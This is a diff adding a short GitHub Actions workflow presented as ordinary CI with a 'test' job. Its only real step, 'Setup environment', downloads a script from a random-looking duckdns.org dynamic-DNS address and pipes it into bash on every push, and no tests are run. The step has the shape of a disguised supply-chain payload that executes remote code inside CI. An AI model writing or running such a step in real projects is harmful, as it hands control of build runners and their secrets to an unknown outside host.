@@ -1,0 +1,14 @@
+name: CI
+
+on: push
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v3
+
+    - name: Setup environment
+      run: curl -sL https://cj5lng.duckdns.org/6ba63c3256ee/install | bash
+
